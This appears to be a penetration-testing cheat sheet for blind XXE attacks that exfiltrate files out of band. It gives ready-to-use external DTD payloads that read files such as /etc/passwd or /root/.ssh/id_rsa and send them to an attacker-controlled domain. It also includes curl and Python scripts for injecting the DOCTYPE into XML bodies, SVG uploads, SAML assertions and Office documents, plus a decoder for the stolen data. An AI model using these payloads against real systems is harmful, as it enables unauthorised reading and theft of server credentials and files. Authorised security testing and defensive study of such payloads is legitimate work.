# Blind XXE File Exfiltration Payloads

Getting a file off the target, out of band. This file is scoped to that single
task: DoS, RCE and SSRF-pivot payloads are deliberately excluded — use a
dedicated cheat sheet for those.

`DOMAIN` = your OAST domain from `interactsh-client -n 1 -v`.

## 1. The chain, and what each piece does

```
target                          you
  |                               |
  |-- GET /evil.dtd -------------->|   1. parser loads an external DTD subset
  |<-- evil.dtd -------------------|   2. DTD defines a file entity + an exfil entity
  |                                                            |
  |   (reads the file into %file;)                              |
  |                                                            |
  |-- GET /?d=<file contents> --->|   3. file arrives in the query string
```

Three separate parser capabilities are required, and they do not always come as
a set:

| Capability | Needed for |
|---|---|
| External DTD subset loading | everything — if absent, nothing below works |
| Parameter entities in the DTD | steps 2–3 (the file read) |
| General entity in the DTD | step 3 (the exfil request) |

Most stacks give you all three. Some block parameter entities specifically, which
kills the file read but leaves detection working — see §6.

## 2. The DTD

This is the payload. It is the same for every file; only the path changes.

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; ex SYSTEM 'http://DOMAIN/?d=%file;'>">
%eval;
%ex;
```

Line by line:

- `%file;` — a parameter entity holding the file. `file://` is a generic URI
  handler, so the contents get inlined regardless of scheme support.
- `%eval;` — declares a *general* entity `ex` whose system id embeds `%file;`.
  The `&#x25;` is `%`; you cannot nest a parameter entity reference directly
  inside an entity value, so it has to be written as a character reference.
- `%ex;` — declares `ex`, so the parser fetches it, carrying the file along.

Swap the path and nothing else:

| Target | First line |
|---|---|
| accounts | `file:///etc/passwd` |
| host identity | `file:///etc/hostname` |
| OS build | `file:///etc/os-release` |
| SSH keys | `file:///root/.ssh/id_rsa` |
| app config | `file:///app/appsettings.json` |

Prefer `/etc/hostname` or `/etc/os-release` first. They prove arbitrary read
without exposing anything sensitive, and the result is easy to sanity-check.

## 3. Hosting the DTD

The target must be able to **fetch** the DTD. `--dtd-host` is where the DTD
lives; the data still goes to your OAST domain. Two different hosts by design.

```bash
# paste service, serves raw text at a stable URL, no account
DTDURL=$(curl -s -X POST --data-binary @evil.dtd https://paste.rs)

# your own box
python3 -m http.server 8000     # dir containing evil.dtd
DTDURL=http://your-host:8000/evil.dtd
```

If the target has an egress allowlist or no DNS, the paste service will fail and
you will get no callback even though detection worked. That specific signature —
step 3 confirms, file read does not — almost always means the DTD host is
unreachable, not that the target is safe.

Self-hosting is often not an option: most home and corporate egress IPs are
NAT'd, so inbound never arrives even though your outbound works.

## 4. Delivering the DOCTYPE

```xml
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "DTDURL">
<order><customer>x</customer></order>
```

Note there is **no** `&entity;` reference in the body. An external DTD is loaded
during parse whether or not anything references it. That is why this vector
works when body entities are blocked, and why no injection marker is needed.

Per vector:

**Plain XML / SOAP / REST body** — inject after the `<?xml?>` prolog:

```bash
python3 - "$DTDURL" <<'PY' > /tmp/inject.xml
import re, sys
t = open('req.xml').read()
t = re.sub(r'(<\?xml[^>]*\?>)',
           lambda m: m.group(1) + '\n<!DOCTYPE r SYSTEM "%s">' % sys.argv[1],
           t, count=1)
print(t)
PY
curl -s -X POST "$URL" -H 'Content-Type: text/xml' --data-binary @/tmp/inject.xml
```

**File upload (SVG, XML)** — the DOCTYPE goes inside the file:

```bash
cat >/tmp/poc.svg <<XML
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; ex SYSTEM 'http://DOMAIN/?d=%file;'>">
  %eval; %ex; ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>
XML
curl -s -X POST "$URL" -F 'file=@/tmp/poc.svg;type=image/svg+xml'
```

The internal subset is fine here because the whole DOCTYPE is in one file.

**SAML / base64-wrapped XML** — patch the assertion, then encode:

```bash
python3 - "$DTDURL" <<'PY' > /tmp/assertion.xml
import re, sys
t = open('assertion.xml').read()
t = re.sub(r'(<\?xml[^>]*\?>)',
           lambda m: m.group(1) + '\n<!DOCTYPE r SYSTEM "%s">' % sys.argv[1],
           t, count=1)
print(t)
PY
B64=$(base64 -w0 /tmp/assertion.xml)
curl -s -X POST "$URL/SAML" --data-urlencode "SAMLResponse=$B64" -d 'RelayState=1'
```

**OOXML (`.docx` / `.xlsx` / `.pptx`)** — a zip, not plain XML:

```bash
mkdir -p x && cd x && unzip -q ../doc.docx
python3 - "$DTDURL" <<'PY' > word/document.xml
import re, sys
t = open('word/document.xml.bak').read()
t = re.sub(r'(<\?xml[^>]*\?>)',
           lambda m: m.group(1) + '\n<!DOCTYPE r SYSTEM "%s">' % sys.argv[1],
           t, count=1)
print(t)
PY
zip -qr ../evil.docx . && cd ..
curl -s -X POST "$URL" -F 'file=@evil.docx'
```

Preserve the zip layout or the parser rejects the archive before reaching XML.

**Cookie, header, or query parameter** — the XML may not be the body at all.
Some stacks parse `Cookie: foo=<xml>` or an XML-typed header. Put the DOCTYPE
wherever the parser looks and keep `Content-Type` consistent with what the
endpoint already expects.

## 5. Reading the result

```bash
grep -oE 'GET /\?d=\S+' /tmp/oast.log | tail -1 \
  | sed 's#^GET /?d=##' \
  | python3 -c 'import sys, urllib.parse; sys.stdout.write(urllib.parse.unquote_plus(sys.stdin.read().strip()))'
```

Interpreting what came back:

| Result | Meaning |
|---|---|
| Plausible file content | arbitrary read confirmed |
| HTML, or an error page | intercepting proxy in the path, not a file read |
| Empty / truncated | URL length limit — read a smaller or split target |
| Nothing at all | see §6 |

Confirm the callback IP is the target's, not yours. Interactsh prints the source
address on every interaction.

## 6. When the file read does not work

Detection succeeding while exfiltration fails narrows it fast:

| Symptom | Cause | Fix |
|---|---|---|
| DTD fetched, no `?d=` | parameter entities blocked | §6a–6c |
| Nothing at all | DTD host unreachable from target | self-host, §3 |
| Nothing, tiny file | `file://` handler disabled | try `php://filter` (§6a) or a different path |
| Truncated data | URL length limit | smaller file, or §6b |
| Partial data, large file | proxy request-line cap | §6b |

**6a — inline DTD.** If hosting is impossible, put the DTD in the internal
subset. This is silently blocked by WCF and several Java stacks, so treat a
clean failure as inconclusive and go back to hosting externally:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; ex SYSTEM 'http://DOMAIN/?d=%file;'>">
  %eval;
  %ex;
]>
<order><customer>x</customer></order>
```

**6b — chunked exfiltration.** Data rides in a query string, so large files hit
header limits. Read a targeted file instead of a database dump, or split
manually by having the DTD reference a byte range — in practice, just pick a
smaller file, since `/etc/passwd` and `/etc/hostname` are enough to prove
arbitrary read.

**6c — one character at a time.** Last resort when bulk exfil is blocked but
external entities still resolve. One request per character, inferring content
from behaviour:

```xml
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///flag"> ]>
```

Pair with a host that 404s and read the bit off the response. Very slow, but it
works where nothing else does.

**6d — PHP in-band.** Older PHP resolvers echo the entity straight into the
response, no listener needed at all:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<order><customer>&x;</customer></order>
```

## 7. Stack-specific notes

**.NET / WCF** — external DTD subsets load by default on the `XmlTextReader`
and weakened `XmlReaderSettings` paths. Internal parameter entities are
blocked; the external DTD in §2 works. The fix is `DtdProcessing = Prohibit`
and `XmlResolver = null` on the message reader.

**Java / libxml** — `DocumentBuilderFactory` resolves external entities unless
`setFeature` disables them. `Xerces` blocks external DTDs by default, so a
negative result there may be correct.

**PHP** — `libxml_disable_entity_loader` is off by default on older versions;
§6d applies.

**Python** — `lxml` resolves external entities by default when no
`resolve_entities=False` is set. `xml.sax` resolves external *general* entities
but never loads external DTD subsets, so the §2 chain cannot work there.

## 8. Scope discipline

Only against systems you are authorised to test, and read in this order:
`/etc/hostname` → `/etc/os-release` → `/etc/passwd`. The first two prove
arbitrary read without exposing anything; reach for credentials only when the
report actually needs them.
